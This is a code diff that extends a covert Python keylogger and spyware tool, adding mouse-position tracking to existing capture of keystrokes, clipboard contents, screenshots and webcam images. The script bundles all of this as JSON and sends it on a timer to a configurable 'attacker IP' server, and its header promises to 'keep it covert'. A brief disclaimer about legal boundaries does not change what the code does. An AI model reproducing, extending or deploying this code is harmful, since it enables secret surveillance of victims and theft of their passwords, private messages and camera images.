@@ -13,7 +13,7 @@
 Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
 """
 
-from pynput import keyboard
+from pynput import keyboard, mouse
 import requests
 import json
 import threading
@@ -26,16 +26,17 @@ import cv2
 
 # Global variables to store captured data
 keystrokes = ""  # Buffer to store captured keystrokes
-clipboard_data = ""  # Global variable to store clipboard content
-previous_clipboard_data = ""  # To track the previous clipboard content
+clipboard_data = ""  # Buffer to store clipboard content
+previous_clipboard_data = ""  # Buffer to track the previous clipboard content
 camera_capture_active = True  # Flag to control camera capture
+mouse_position = ""  # Buffer to store the current mouse position
 
 # Configuration settings
 server_ip = "127.0.0.1"  # Change this based on your attacker IP
 server_port = 8080  # Change this based on your specified port
-send_interval = 10 # Interval (in seconds) between sending keystrokes and clipboard data (Change if needed)
-screenshot_interval = 10 # Interval (in seconds) between sending screenshots (Change if needed)
-image_capture_interval = 10 # Interval (in seconds) between capturing camera images (Change if needed)
+send_interval = 10  # Interval (in seconds) between sending data
+screenshot_interval = 10  # Interval (in seconds) between sending screenshots
+image_capture_interval = 10  # Interval (in seconds) between capturing camera images
 
 # Track whether Ctrl, Alt, Shift is pressed
 ctrl_pressed = False
@@ -80,7 +81,7 @@ def capture_camera_image():
         return ""
 
 def send_data():
-    global keystrokes, clipboard_data, camera_capture_active
+    global keystrokes, clipboard_data, camera_capture_active, mouse_position
     last_screenshot_time = time.time()
     last_image_capture_time = time.time()
     while True:
@@ -94,12 +95,13 @@ def send_data():
             if current_time - last_image_capture_time >= image_capture_interval:
                 camera_image_base64 = capture_camera_image()
                 last_image_capture_time = current_time
-            # Only include clipboard data if it has a value
+            # Prepare the payload with mouse position
             payload_data = {
                 "keyboardData": keystrokes,
                 "screenshot": screenshot_base64,
                 "clipboardData": clipboard_data,
-                "cameraImage": camera_image_base64
+                "cameraImage": camera_image_base64,
+                "mousePosition": mouse_position
             }
             # Create payload in JSON format
             payload = json.dumps(payload_data)
@@ -108,6 +110,7 @@ def send_data():
             # Clear the buffer after successful send
             keystrokes = ""
             clipboard_data = ""
+            mouse_position = ""  # Clear mouse position after sending
             # If we successfully sent data, camera capture is active
             camera_capture_active = True
         except requests.ConnectionError as e:
@@ -144,7 +147,7 @@ def handle_keystrokes(key):
             return
         else:
             if not (ctrl_pressed or alt_pressed):
-                keystrokes += str(key).strip("'")      
+                keystrokes += str(key).strip("'")
     except Exception as e:
         print(f"Error processing key: {e}")
 
@@ -154,7 +157,7 @@ def on_release(key):
         ctrl_pressed = False
     elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
         alt_pressed = False
-    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.shift:
+    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
         shift_pressed = False
 
 def monitor_clipboard():
@@ -169,7 +172,14 @@ def monitor_clipboard():
             print(f"Failed to read clipboard data: {e}")
         time.sleep(1)  # Polling interval (Change if needed)
 
+def on_move(x, y):
+    global mouse_position
+    mouse_position = f"({x}, {y})"  # Update global variable with mouse position
+
 if __name__ == "__main__":
+    # Start the mouse listener
+    mouse_listener = mouse.Listener(on_move=on_move)
+    mouse_listener.start()
     # Start the data sending thread
     data_thread = threading.Thread(target=send_data, daemon=True)
     data_thread.start()
